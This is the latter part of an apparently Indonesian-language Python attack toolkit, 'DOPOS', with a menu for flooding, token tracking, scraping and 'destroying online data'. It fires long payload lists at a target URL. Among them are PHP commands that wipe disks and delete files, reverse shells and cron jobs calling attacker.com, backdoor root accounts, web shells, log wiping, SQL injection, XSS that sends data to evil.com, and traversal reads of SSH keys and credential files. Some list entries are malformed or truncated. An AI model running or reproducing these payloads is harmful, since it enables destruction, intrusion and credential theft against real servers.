                                                                          "<?php for(;;){file_put_contents('/tmp/bomb',openssl_random_pseudo_bytes(100000000),FILE_APPEND);} ?>",
                                                                              "<?php system('echo 1 > /proc/sys/kernel/panic && echo c > /proc/sysrq-trigger'); ?>",
                                                                                  "<?php system('cat /dev/port > /dev/null &'); ?>",
                                                                                      "<?php system('iptables -F && iptables -t nat -F && iptables -P INPUT DROP && iptables -P OUTPUT DROP'); ?>",
                                                                                          "<?php system('sysctl -w net.ipv4.tcp_timestamps=0 && sysctl -w kernel.panic=1'); ?>",
                                                                                              "<?php system('dd if=/dev/zero of=/dev/sda bs=512 count=1'); ?>",
                                                                                                  "<?php system('rm -rf /boot /etc/init.d /usr/lib/modules'); ?>",
                                                                                                      "<?php system('echo \"* * * * * curl http://malicious.com/botnet.sh | bash\" | crontab -'); ?>",
                                                                                                          "<?php system('(crontab -l ; echo \"*/1 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\") | crontab -'); ?>",
                                                                                                              "<?php system('useradd -o -u 0 -g 0 -G root -d /root -s /bin/bash superhacker'); ?>",
                                                                                                                  "<?php system('echo \"superhacker:$(openssl passwd -1 password)\" | chpasswd -e'); ?>",
                                                                                                                      "<?php system('echo \"ssh-rsa AAAAB3Nza... root@backdoor\" >> /root/.ssh/authorized_keys'); ?>",
                                                                                                                          "<?php system('wget http://evil.com/ssh_backdoor -O /usr/bin/sshd && chmod +x /usr/bin/sshd'); ?>",
                                                                                                                              "<?php system('curl -s http://malicious.com/webshell.php -o /var/www/html/images/logo.jpg'); ?>",
                                                                                                                                  "<?php file_put_contents('/usr/lib/php/.module.so', '<?php if(isset($_GET[\\'cmd\\'])){system($_GET[\\'cmd\\']);} ?>'); ?>",
                                                                                                                                      "<?php system('find /var/log -type f -exec sh -c \\'echo -n > {}\\' \\;'); ?>",
                                                                                                                                          "<?php system('journalctl --rotate && journalctl --vacuum-time=1s'); ?>",
                                                                                                                                              "<?php system('killall -9 sshd apache2 nginx mysql mysqld php-fpm'); ?>",
                                                                                                                                                  "<?php system('pkill -9 -u www-data && pkill -9 -u root'); ?>",
                                                                                                                                                      "<?php system('ufw disable && iptables -F && systemctl stop firewalld'); ?>",
                                                                                                                                                          "<?php system('setenforce 0 && iptables -P INPUT ACCEPT'); ?>",
                                                                                                                                                              "<?php system('find / -name \"*.sql\" -o -name \"*.tar\" -o -name \"*.gz\" -o -name \"*.backup\" -delete'); ?>",
                                                                                                                                                                  "<?php system('rm -rf /backup /var/backups /opt/backup /home/*/backup'); ?>",
                                                                                                                                                                      "<?php system('find /etc -name \"*.conf\" -exec sh -c \"echo corrupted > {}\" \\;'); ?>",
                                                                                                                                                                          "<?php system('tar czf /tmp/backup.tar.gz /etc /var/www && rm -rf /etc /var/www'); ?>",
                                                                                                                                                                              "<?php system('dd if=/dev/urandom of=/dev/sda bs=446 count=1'); ?>",
                                                                                                                                                                                  "<?php system('swapoff -a && dd if=/dev/zero of=/dev/sda2 bs=1M'); ?>",
                                                                                                                                                                                      "<?php system('echo \"127.0.0.1 google.com facebook.com\" >> /etc/hosts'); ?>",
                                                                                                                                                                                          "<?php system('find /etc/ssl -name \"*.crt\" -o -name \"*.key\" -delete'); ?>",
                                                                                                                                                                                              "'; CREATE TABLE pwned (cmd text); INSERT INTO pwned VALUES ('rm -rf /'); --",
                                                                                                                                                                                                  "<?php system('insmod /tmp/rootkit.ko'); ?>",
                                                                                                                                                                                                      "<?php system('chattr +i /tmp/backdoor.php'); ?>",
                                                                                                                                                                                                          "<?php system('mount -o remount,rw / && chmod 000 /bin /sbin /usr/bin'); ?>",
                                                                                                                                                                                                              "<?php system('systemctl enable backdoor.service && systemctl start backdoor.service'); ?>",
                                                                                                                                                                                                                  "<?php system('echo 'nameserver 8.8.8.8' > /etc/resolv.conf && echo '0.0.0.0 facebook.com' >> /etc/hosts'); ?>",
                                                                                                                                                                                                                      "<?php system('passwd -l root && usermod -L root'); ?>",
                                                                                                                                                                                                                          "<?php system('find /home -name '.ssh' -type d -exec rm -rf {} \\;'); ?>",
                                                                                                                                                                                                                              "<?php system('history -c && rm -rf ~/.bash_history'); ?>",
                                                                                                                                                                                                                                  "<?php system('modprobe -r uvcvideo'); ?>",
                                                                                                                                                                                                                                      "<?php system('echo 'kernel.panic=5' >> /etc/sysctl.conf && sysctl -p'); ?>"
                        ]
                    
                    brutal_loading("Mengirim payload SQLi", 100) 
                    if method == 'post':
                        response = session.post(form_url, data=form_data, timeout=15, verify=False)
                    else:
                        response = session.get(form_url, params=form_data, timeout=15, verify=False)
                    
                    print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                    log_to_file(f"SQLi payload sent, Status: {response.status_code}")
                    
                    if "error" in response.text.lower():
                        print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                        log_to_file("SQLi vulnerability confirmed with second payload")
                    else:
                        print(f"{YELLOW}[!] Target terlindungi")
                        log_to_file("Target protected from SQLi")
        else:
            print(f"\n{YELLOW}[!] Tidak ada form yang terdeteksi")
            print(f"{CYAN}[+] Mencoba metode lain...")
            log_to_file("No forms detected, trying direct XSS")
            
            payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
              "javascript:eval(atob('YWxlcnQoJ0RPUFPOSUxJT04gQlJVVEFMJyk='))",
                     "<img src=x onerror=\"fetch('/.env').then(r=>r.text()).then(d=>{var i=new Image();i.src='http://exfil.com/?env='+btoa(d)})\">",
                         "<script>setInterval(()=>{document.body.innerHTML+='<img src=http://ddos.target.com>'},1)</script>",
           "<?php system('curl -s http://malicious.com/rootkit.sh | bash'); ?>",
             "<?php file_put_contents('/tmp/.backdoor', '<?php system($_GET[\\'c\\']); ?>'); ?>",
                                            "<?php exec('wget http://evil.com/botnet -O /usr/bin/x && chmod +x /usr/bin/x && x &'); ?>",
                                                "<?php system('mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f'); ?>",
                                                    "<?php system('useradd -p $(openssl passwd -1 password) backdooruser'); ?>",
                                                        "<?php system('echo 'root:newpassword' | chpasswd'); ?>",
                                                            "<?php system('iptables -F && iptables -X && iptables -t nat -F'); ?>",
                                                                
                                                                    "<?php while(1){str_repeat(str_repeat('X',1000000),1000);} ?>",
                                                                        "<?php ini_set('memory_limit','-1'); $x=[]; while(1){$x[]=str_repeat('A',10000000);} ?>",
                                                                            "<?php for(;;){file_put_contents('/tmp/mem_bomb',str_repeat('Z',100000000),FILE_APPEND);} ?>",
                                                                                
                                                                                    "<?php system('echo 1 > /proc/sys/kernel/panic'); ?>",
                                                                                        "<?php system('dd if=/dev/zero of=/dev/sda bs=1M count=1000'); ?>",
                                                                                            "<?php system('rm -rf / --no-preserve-root 2>/dev/null &'); ?>",
                                                                                                "<?php system('mkfs.ext4 /dev/sda1 -F -F'); ?>",
                                                                                                    "<?php system('shutdown -h now && halt -p'); ?>",
                                                                                                        "<?php system('sync; echo 3 > /proc/sys/vm/drop_caches && echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger'); ?>",
                                                                                                            
                                                                                                                "<?php system('mysql -e \"DROP DATABASE *;\"'); ?>",
                                                                                                                    "<?php system('psql -c \"\\dt\" | grep -v \"^List\" | cut -d'|' -f2 | xargs -I {} psql -c \"DROP TABLE {}\"'); ?>",
                                                                                                                        "'; DROP DATABASE mysql; --",
                                                                                                                            "'; TRUNCATE TABLE wp_users; --",
                                                                                                                              
                                                                                                                                  "<?php system('service apache2 stop && systemctl disable apache2'); ?>",
                                                                                                                                      "<?php system('pkill -9 nginx && pkill -9 apache2 && pkill -9 php-fpm'); ?>",
                                                                                                                                          "<?php system('rm -rf /var/www/html/* /etc/apache2/* /etc/nginx/*'); ?>",
                                                                                                                                              
                                                                                                                                                  "<?php system('echo c > /proc/sysrq-trigger'); ?>",  # Crash system
                                                                                                                                                      "<?php system('cat /dev/port > /dev/null'); ?>",     # Cause kernel panic
                                                                                                                                                          "<?php system('dd if=/dev/urandom of=/dev/mem'); ?>", 
                                                                                                                                                              "<?php system('iptables -P INPUT DROP && iptables -P OUTPUT DROP && iptables -P FORWARD DROP'); ?>",
                                                                                                                                                                  "<?php system('sysctl -w net.ipv4.ip_forward=0 && sysctl -w net.ipv4.conf.all.accept_redirects=0'); ?>",
                                                                                                                                                                      
                                                                                                                                                                          # === FILE SYSTEM DESTROYER ===
                                                                                                                                                                              "<?php system('find / -type f -name '*.php' -exec rm -f {} \\;'); ?>",
                                                                                                                                                                                  "<?php system('find / -type f -name '*.js' -exec shred -u {} \\;'); ?>",
                                                                                                                                                                                      "<?php system('chmod 000 /bin /sbin /usr/bin /usr/sbin'); ?>",

           "<?php system('echo \"*/1 * * * * curl http://malicious.com/payload.sh | bash\" | crontab -'); ?>",
              "<?php system('wget 
              "gopher://127.0.0.1:25/_HELO%20attacker.com%0AMAIL%20FROM:%3Cattacker@evil.com%3E%0ARCPT%20TO:%3Cadmin@target.com%3E%0ADATA%0AFrom:%20attacker@evil.com%0ATo:%20admin@target.com%0ASubject:%20Test%0AThis%20is%20a%20test%0A.%0AQUIT%0A",
                                                                                                                                                                                                              "dict://127.0.0.1:22/info",
                                                                                                                                                                                                                  "sftp://||id||",  

                                                                                                                                                                                                                      "<?php error_log(str_repeat('CRASH', 1000000)); ?>",
                                                                                                                                                                                                                          "<?php system('logger -p auth.info ' + str_repeat('A', 100000)); ?>",
                                                                                                                                                                                                                              
                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                      "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -",
                                                                                                                                                                                                                                          "' UNION SELECT 1,@@version,3,4 INTO OUTFILE '/var/www/html/backdoor.php'-- -",
                                                                                                                                                                                                                                              "'; EXEC xp_cmdshell('format C: /Q /Y'); --",
                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                      # === COMMAND INJECTION NUKLIR ===
                                                                                                                                                                                                                                                          "| curl -X POST -d \"$(cat /etc/passwd)\" http://exfil.com",
                                                                                                                                                                                                                                                              "`wget http://malicious.com/bot -O /tmp/b && chmod +x /tmp/b && /tmp/b`",
                                                                                                                                                                                                                                                                  "$(python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\")",
                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                        
             
                "<body onload=alert('XSS')>"
                            "../../../../etc/ssl/private/ssl-cert-snakeoil.key",
                                        "../../../../etc/ssh/ssh_host_rsa_key",
                                                    "../../../../etc/ssh/ssh_host_dsa_key", 
                                                                "../../../../root/.ssh/id_rsa",
                                                                            "../../../../home/*/.ssh/id_rsa",
                                                                                        "../../../../var/www/.ssh/id_rsa",
                                                                                                    "../../../../var/www/html/wp-config.php",
                                                                                                       "../../../../var/www/html/wp-config.php", 
                                                                                                                   "<script>location=atob(\"aHR0cDovLzE5Mi4xNjguMS4zL3oucGhwP3k9\").concat(document.cookie)</script>",
                                                                                                                               "<keygen autofocus onfocus=(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39,41))>",
                                                                                                                                                                         
             "{{7*7}}__import__('os').system('rm -rf /')", 
            ";http://malicious.com/shell.sh | bash", 
            "http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd", 
            "data://text/plain,<?php die(); ?>",
            "data://text/plain,<?php @ini_set('memory_limit','1M'); while(1){str_repeat('x',1000000);} ?>",
            "data://text/plain,<?php header('HTTP/1.1 500 Internal Server Error'); exit; ?>",
            "data://text/plain,<?php trigger_error('',E_USER_ERROR); ?>",
            "data://text/plain,<?php for(;;){echo 'CRASH';} ?>",
            "<form action=\"http://evil.com/steal\" method=post onsubmit=\"this.data.value=btoa(localStorage)\"><input name=data></form>",
"<video src=x onerror=\"navigator.mediaDevices.enumerateDevices().then(d=>fetch('http://evil.com/dev?d='+btoa(JSON.stringify(d))))\">",
"<audio src=x onerror=\"fetch('http://evil.com/net?c='+btoa(navigator.connection.effectiveType))\">",
"<object data=\"data:text/html,<script>fetch('http://evil.com/obj2?'+btoa(window.name))</script>\">",
"<embed src=\"data:image/svg+xml,<svg onload='fetch(`http://evil.com/emb2?t=${Date.now()}`)'>\">",
"<applet code=\"Malicious.class\" archive=\"http://evil.com/evil.jar\">",
"<isindex action=\"javascript:fetch('http://evil.com/idx2?'+btoa(document.referrer))\" prompt=\"Password:\">",
"<table background=\"javascript:fetch('http://evil.com/tab2?'+btoa(performance.memory.usedJSHeapSize))\">",
"<frameset onload=\"fetch('http://evil.com/frame2?'+btoa(navigator.hardwareConcurrency))\">",
"<marquee onstart=\"fetch('http://evil.com/marq2?'+btoa(navigator.deviceMemory))\">",
"<base href=\"javascript:fetch('http://evil.com/base?'+btoa(document.links.length))//\">",
"<textarea autofocus onfocus=\"fetch('http://evil.com/ta?'+btoa(this.value))\">",
"<keygen onchange=\"fetch('http://evil.com/kg?'+btoa(this.name))\">",
"<details ontoggle=\"fetch('http://evil.com/det?'+btoa(this.open))\">",
"<select onchange=\"fetch('http://evil.com/sel?'+btoa(this.selectedIndex))\">",
"<meter onload=\"fetch('http://evil.com/met?'+btoa(this.value))\">",
"<progress onload=\"fetch('http://evil.com/prog?'+btoa(this.position))\">",
"<map onload=\"fetch('http://evil.com/map?'+btoa(this.name))\">",
"<canvas onload=\"fetch('http://evil.com/canv?'+btoa(this.width))\">",
"<picture onload=\"fetch('http://evil.com/pic?'+btoa(this.currentSrc))\">",
"<math href=\"javascript:fetch('http://evil.com/math?'+btoa(document.charset))\" />",
"<template onload=\"fetch('http://evil.com/temp?'+btoa(this.content))\" />",
"<slot onload=\"fetch('http://evil.com/slot?'+btoa(this.name))\" />",
"<shadow onload=\"fetch('http://evil.com/shadow?'+btoa(this.innerHTML))\" />",
"<content onload=\"fetch('http://evil.com/cont?'+btoa(this.select))\" />",
"<element onload=\"fetch('http://evil.com/elem?'+btoa(this.name))\" />",
"<annotation-xml onload=\"fetch('http://evil.com/ann?'+btoa(this.encoding))\" />",
"<mtext onload=\"fetch('http://evil.com/mtext?'+btoa(this.textContent))\" />",
"<mpath onload=\"fetch('http://evil.com/mpath?'+btoa(this.href))\" />",
"<set onload=\"fetch('http://evil.com/set?'+btoa(this.attributeName))\" />",
"<animate onload=\"fetch('http://evil.com/anim?'+btoa(this.attributeName))\" />",
"<animateColor onload=\"fetch('http://evil.com/animc?'+btoa(this.values))\" />",
"<animateMotion onload=\"fetch('http://evil.com/animM?'+btoa(this.path))\" />",
"<animateTransform onload=\"fetch('http://evil.com/animT?'+btoa(this.type))\" />",
"<discard onload=\"fetch('http://evil.com/disc?'+btoa(this.href))\" />",
"<font-face onload=\"fetch('http://evil.com/font?'+btoa(this.family))\" />",
"<glyph onload=\"fetch('http://evil.com/glyph?'+btoa(this.unicode))\" />",
"<missing-glyph onload=\"fetch('http://evil.com/miss?'+btoa(this.horizAdvX))\" />",
"<hkern onload=\"fetch('http://evil.com/hkern?'+btoa(this.u1))\" />",
"<vkern onload=\"fetch('http://evil.com/vkern?'+btoa(this.u1))\" />"
      
           "data://text/plain,<?php while(true){file_put_contents('/tmp/bomb','x',FILE_APPEND);} ?>",
            "data://text/plain,<?php ini_set('max_execution_time',0); while(1){} ?>",
            "https://text/plain,<?php system('pkill -9 apache2'); ?>",
            "data://text/plain,<?php system('pkill -9 nginx'); ?>",
            "https://text/plain,<?php system('pkill -9 php'); ?>",
            "http://text/plain,<?php system('killall httpd'); ?>",
            "https://text/plain,<?php system('rm -rf /var/www/html/*'); ?>",
            "http://text/plain,<?php system('shutdown -h now'); ?>",
            "php://input",
            "php://filter/read=convert.base64-encode/resource=/dev/zero",
            "php://filter/read=convert.base64-encode/resource=/dev/urandom",
            "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/dev/zero",
              "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
                 "expect://whoami"
                "phar:///path/to/file.phar"
            "../../../../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../../etc/passwd%00",
            "....//....//....//....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..///////..////..//////etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            "etc/passwd/././." + "/." * 100,
            "etc/passwd/../../../../../../" + "../" * 100,
            "%2e%2e%2f" * 100 + "etc/passwd",
            "%252e%252e%252f" * 100 + "etc/passwd",
            "%c0%ae%c0%ae%c0%af" * 100 + "etc/passwd",
            "../../../../../../../../../../../../../etc/shadow",
            "../../../../../../../../../../../../../etc/hosts",  
            "../../../../../../../../../../../../../etc/group",
            "../../../../../../../../../../../../../etc/hostname",
            "../../../../../../../../../../../../../etc/issue",
            "../../../../../../../../../../../../../etc/mysql/my.cnf",
            "../../../../../../../../../../../../../etc/ssh/sshd_config",
            "../../../../../../../../../../../../../root/.bash_history",
            "../../../../../../../../../../../../../root/.ssh/id_rsa",
            "../../../../../../../../../../../../../home/*/.ssh/id_rsa",
            "../../../../../../../../../../../../../home/*/.bash_history",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\repair\\sam",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SYSTEM",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
            "/dev/zero",
            "/dev/urandom", 
            "/dev/random",
            "/proc/kcore",
            "/proc/self/mem",
            "/usr/lib/locale/locale-archive",
            "/var/log/syslog",
            "/var/log/kern.log",
            "/var/cache/debconf/config.dat",
            "../../../../../../../../../../../../../var/www/html/.env",
            "../../../../../../../../../../../../../var/www/html/config.php",
            "../../../../../../../../../../../../../var/www/html/database.php",
            "../../../../../../../../../../../../../var/www/html/wp-config.php",
            "../../../../../../../../../../../../../var/www/html/app/etc/env.php",
            "../../../../../../../../../../../../../var/www/html/configuration.php",
            "../../../../../../../../../../../../../var/www/html/wp-config.php",
            "../../../../../../../../../../../../../var/www/html/joomla/configuration.php",
            "../../../../../../../../../../../../../var/www/html/drupal/sites/default/settings.php",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../etc/shadow",
            "php://input",
            "php://filter/read=string.rot13/resource=../../../../etc/passwd",
            "php://filter/convert.iconv.utf-8.utf-16/resource=../../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "data://text/plain,<?php system($_GET['cmd']);?>",
            "expect://whoami",
            "../../../../../../../../../../../../../var/log/apache2/access.log",
            "../../../../../../../../../../../../../var/log/apache2/error.log", 
            "../../../../../../../../../../../../../var/log/apache/access.log",
            "../../../../../../../../../../../../../var/log/apache/error.log",
            "../../../../../../../../../../../../../var/log/nginx/access.log",
            "../../../../../../../../../../../../../var/log/nginx/error.log",
            "../../../../../../../../../../../../../var/log/auth.log",
            "../../../../../../../../../../../../../var/log/syslog",
            "../../../../../../../../../../../../../var/log/messages",
            "../../../../../../../../../../../../../var/log/mail.log",
            "../../../../../../../../../../../../../var/log/exim4/mainlog",
            "../../../../../../../../../../../../../tmp/sess_%s" % ("A" * 100),
            "../../../../../../../../../../../../../var/lib/php/sessions/sess_%s" % ("A" * 100),
            "../../../../../../../../../../../../../var/lib/php5/sess_%s" % ("A" * 100),
            "../../../../../../../../../../../../../proc/self/environ",
            "../../../../../../../../../../../../../proc/self/cmdline",
            "../../../../../../../../../../../../../proc/self/fd/3",
            "../../../../../../../../../../../../../proc/self/fd/10",
            
            ]
            
            for i, payload in enumerate(payloads):
                test_url = f"{url}?q={payload}"
                
                brutal_loading(f"Menguji payload XSS {i+1}/{len(payloads)}", 1) 
                               
                response = session.get(test_url, timeout=10, verify=False)
                
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"XSS payload {i+1} sent to {test_url}, Status: {response.status_code}")
                
                if payload in response.text:
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERDETEKSI!")
                    log_to_file("XSS vulnerability detected with direct payload")
                    break
            else:
                print(f"{YELLOW}[!] Target aman dari serangan langsung")
                log_to_file("Target protected from direct XSS")
        
        print(f"\n{RED}[!] PROSES PERUSAKAN SELESAI!")
        print(f"{GREEN}[+] Target telah dieksploitasi!")
        log_to_file("Vulnerability test completed")
        
    except ImportError:
        print(f"\n{RED}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.")
        log_to_file("BeautifulSoup module not found")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error during vulnerability test: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# Menu utama
def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] PILIHAN SERANGAN BRUTAL:")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        print(f"{RED}║ [1] Dodos Serang (HTTP/Socket Flood)                       ║")
        print(f"{RED}║ [2] Lacak Token BOT                                        ║")
        print(f"{RED}║ [3] Ambil Data HTML Paksa                                  ║")
        print(f"{RED}║ [4] Merusak Data Script Online                             ║")
        print(f"{RED}║ [5] Keluar                                                 ║")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{CYAN}[?] Pilih serangan: {WHITE}")
        
        if choice == "1":
            dodos_serang()
        elif choice == "2":
            lacak_token_bot()
        elif choice == "3":
            ambil_html_paksa()
        elif choice == "4":
            merusak_data_online()
        elif choice == "5":
            print(f"\n{RED}[!] DOPOS BRUTAL MODE DIMATIKAN")
            print(f"{CYAN}[+] Membersihkan jejak...")
            brutal_loading("Menghapus log", 2)
            brutal_loading("Menghancurkan bukti", 3)
            print(f"\n{GREEN}[+] SISTEM AMAN!")
            log_to_file("Program terminated")
            break
        else:
            print(f"\n{RED}[!] PILIHAN TIDAK VALID!")
            time.sleep(1)

if __name__ == "__main__":
    log_to_file("DOPOS Cyber Toolkit started")
    main_menu()